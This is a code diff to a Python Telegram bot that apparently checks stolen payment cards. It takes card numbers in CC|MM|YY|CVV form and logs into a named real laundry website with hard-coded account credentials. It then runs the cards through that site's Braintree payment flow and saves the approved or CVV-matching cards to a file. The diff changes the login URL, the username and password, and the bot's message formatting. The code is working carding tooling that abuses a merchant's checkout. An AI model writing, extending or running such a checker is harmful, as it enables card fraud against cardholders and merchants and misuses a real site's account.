@@ -108,7 +108,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
             'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
-        response = await session.get('https://boltlaundry.com/loginnow/', headers=headers)
+        response = await session.get('https://boltlaundry.com/my-login/', headers=headers)
 
         login = gets(response.text, '<input type="hidden" name="ihc_login_nonce" value="', '"')
 
@@ -134,11 +134,11 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
         data = {
             'ihcaction': 'login',
             'ihc_login_nonce': login,
-            'log': 'DianaMor',
-            'pwd': 'DianaMorrison1209',
+            'log': 'DianaMor9',
+            'pwd': 'DianaMorrison129',
         }
 
-        response = await session.post('https://boltlaundry.com/loginnow/', headers=headers, data=data)
+        response = await session.post('https://boltlaundry.com/my-login/', headers=headers, data=data)
 
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -459,25 +459,25 @@ async def multi_checking(fullz: str) -> str:
 
     if error_message:
         output = (
-            f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
-            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
-            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {error_message} ❌\n"
-            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: » {country}\n"
-            f"𝗕𝗿𝗮𝗻𝗱: » {brand}\n"
-            f"𝗕𝗮𝗻𝗸: » {bank}\n"
-            f"𝗣𝗿𝗲𝗽𝗮𝗶𝗱: » {prepaid}\n"
-            f"𝗧𝗶𝗺𝗲: » {elapsed}s"
+            f"𝗖𝗮𝗿𝗱 ➯ <code>{fullz}</code>\n"
+            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
+            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {error_message} ❌\n"
+            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ {country}\n"
+            f"𝗕𝗿𝗮𝗻𝗱 ➯ {brand}\n"
+            f"𝗕𝗮𝗻𝗸 ➯ {bank}\n"
+            f"𝗣𝗿𝗲𝗽𝗮𝗶𝗱 ➯ {prepaid}\n"
+            f"𝗧𝗶𝗺𝗲 ➯ {elapsed}s"
         )
     else:
         output = (
-            f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
-            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
-            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {response}\n"
-            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: » {country}\n"
-            f"𝗕𝗿𝗮𝗻𝗱: » {brand}\n"
-            f"𝗕𝗮𝗻𝗸: » {bank}\n"
-            f"𝗣𝗿𝗲𝗽𝗮𝗶𝗱: » {prepaid}\n"
-            f"𝗧𝗶𝗺𝗲: » {elapsed}s"
+            f"𝗖𝗮𝗿𝗱 ➯ <code>{fullz}</code>\n"
+            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
+            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {response}\n"
+            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ {country}\n"
+            f"𝗕𝗿𝗮𝗻𝗱 ➯ {brand}\n"
+            f"𝗕𝗮𝗻𝗸 ➯ {bank}\n"
+            f"𝗣𝗿𝗲𝗽𝗮𝗶𝗱 ➯ {prepaid}\n"
+            f"𝗧𝗶𝗺𝗲 ➯ {elapsed}s"
         )
         if any(key in response for key in ["Approved", "CVV INCORRECT", "CVV MATCH", "INSUFFICIENT FUNDS"]):
             with open("auth.txt", "a", encoding="utf-8") as file:
@@ -497,7 +497,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             save_admin_chat_ids(admin_chat_ids)
             await update.message.reply_text(
                 f"𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗢𝗪𝗡𝗘𝗥 🤗\n"
-                "SEND CARD IN FORMAT » CC|MM|YY|CVV\n"
+                "SEND CARD ➯ CC|MM|YY|CVV\n"
             )
         else:
             await update.message.reply_text("BOT IS NOT CONFIGURED YET, ONLY OWNER ADMIN CAN REGISTER FIRST.")
@@ -509,7 +509,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     await update.message.reply_text(
         "𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
-        "SEND CARD IN FORMAT » CC|MM|YY|CVV\n"
+        "SEND CARD ➯ CC|MM|YY|CVV\n"
     )
 
 async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
